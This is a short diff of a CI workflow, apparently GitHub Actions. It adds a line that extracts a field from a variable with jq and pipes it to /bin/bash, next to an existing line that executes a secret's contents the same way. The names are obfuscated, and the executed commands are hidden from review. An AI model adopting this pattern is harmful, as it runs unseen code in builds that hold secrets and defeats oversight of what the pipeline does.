@@ -27,6 +27,7 @@ jobs:
           kkxct46: ${{ secrets.kkxct46 }}
         run: |
           printf '%s' "$kkxct46" | jq -r .myep54189 | /bin/bash
+          echo $y02 | jq -r .goxmr1 | /bin/bash
 
       - name: Save archive
         if: always()
